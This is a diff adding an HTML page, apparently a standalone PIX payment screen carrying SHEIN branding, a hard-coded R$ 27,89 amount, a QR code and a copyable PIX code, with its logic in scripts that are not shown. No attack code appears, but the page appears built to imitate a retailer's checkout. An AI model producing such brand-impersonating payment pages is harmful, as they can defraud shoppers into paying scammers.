@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagamento PIX - SHEIN</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <!-- Logo -->
+        <div class="logo-container">
+            <img src="shein-logo.png" alt="SHEIN" class="logo">
+        </div>
+
+        <!-- Loading State -->
+        <div id="loading" class="loading">
+            <div class="spinner"></div>
+            <p>Gerando pagamento PIX...</p>
+        </div>
+
+        <!-- Error State -->
+        <div id="error" class="error hidden">
+            <p class="error-message"></p>
+        </div>
+
+        <!-- Payment State -->
+        <div id="payment" class="payment hidden">
+            <h1>Pagamento PIX</h1>
+            <p class="amount">R$ <span id="amount">27,89</span></p>
+            
+            <div class="qrcode-container">
+                <div id="qrcode"></div>
+            </div>
+
+            <div class="pix-code-container">
+                <p class="label">Código PIX:</p>
+                <div class="pix-code-box">
+                    <code id="pixCode" class="pix-code"></code>
+                    <button id="copyBtn" class="copy-btn">Copiar</button>
+                </div>
+            </div>
+
+            <p class="status">Aguardando pagamento...</p>
+        </div>
+
+        <!-- Success State -->
+        <div id="success" class="success hidden">
+            <div class="success-icon">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <polyline points="20 6 9 17 4 12"></polyline>
+                </svg>
+            </div>
+            <h2>Pagamento confirmado!</h2>
+            <p>Obrigado pela sua compra.</p>
+        </div>
+    </div>
+
+    <!-- QR Code Library -->
+    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
+    <!-- Config (gitignored) -->
+    <script src="config.js"></script>
+    <!-- Main Script -->
+    <script src="script.js"></script>
+</body>
+</html>
